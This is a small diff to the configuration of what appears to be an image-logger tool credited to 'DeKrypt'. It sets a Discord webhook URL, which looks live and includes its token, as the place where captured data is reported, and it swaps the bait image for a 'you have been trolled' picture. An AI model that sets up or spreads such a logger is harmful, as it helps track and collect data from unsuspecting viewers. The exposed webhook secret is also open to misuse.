@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1338664064565383250/89PU6ytwq0y9kMB2_mXBrNzxW70dC_qYp2e9ihBj4BoV3XHzmTFbrDcGWkRzblzHCImj",
-    "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.deviantart.com%2Fjulianmarreroskibidi%2Fart%2FMe-as-peter-griffin-1154785643&psig=AOvVaw21cAzvxS9t8jaCkpfDxmeO&ust=1739319470885000&source=images&cd=vfe&opi=89978449&ved=2ahUKEwja0fyKrLqLAxXnw_ACHfTvCRkQjRx6BAgAEBk.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://art.ngfiles.com/images/1923000/1923949_invaderdaniel_you-have-been-trolled.png?f1625185981", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
